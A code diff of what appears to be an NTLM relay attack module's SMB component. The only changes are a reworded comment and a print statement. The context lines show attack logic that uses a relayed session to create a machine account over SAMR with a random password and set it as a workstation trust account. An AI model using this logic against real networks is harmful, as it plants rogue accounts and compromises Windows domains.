@@ -110,7 +110,7 @@ class SMBAttack(ProtocolAttack):
                             raise e
 
                     # Account password setup. In the NTLM relay situation it is not possible to use 'hSamrSetPasswordInternal4New()' because an error for "STATUS_WRONG_PASSWORD" is raised
-                    # For the moment, don't know why this error is raised with the "USER_FORCE_PASSWORD_CHANGE" access mask during a relay
+                    # For the moment, I'm not sure why this error is raised even with the "USER_FORCE_PASSWORD_CHANGE" access mask during a relay. Probably an encryption issue
                     # However, with 'hSamrChangePasswordUser()' it seems to work by specifying the "old HashNT" which is the default "blank" password hash
                     newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
                     try:
@@ -129,7 +129,7 @@ class SMBAttack(ProtocolAttack):
                     req['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
                     req['Control']['UserAccountControl'] = samr.USER_WORKSTATION_TRUST_ACCOUNT
                     samr.hSamrSetInformationUser2(remoteOps.getSamr(), userHandle, req)
-                    print("Successfully added machine account %s with password %s." % (computerName, newPassword))
+                    print("Successfully added machine account %s with password %s" % (computerName, newPassword))
                 except Exception as e:
                     LOG.error(str(e))
 
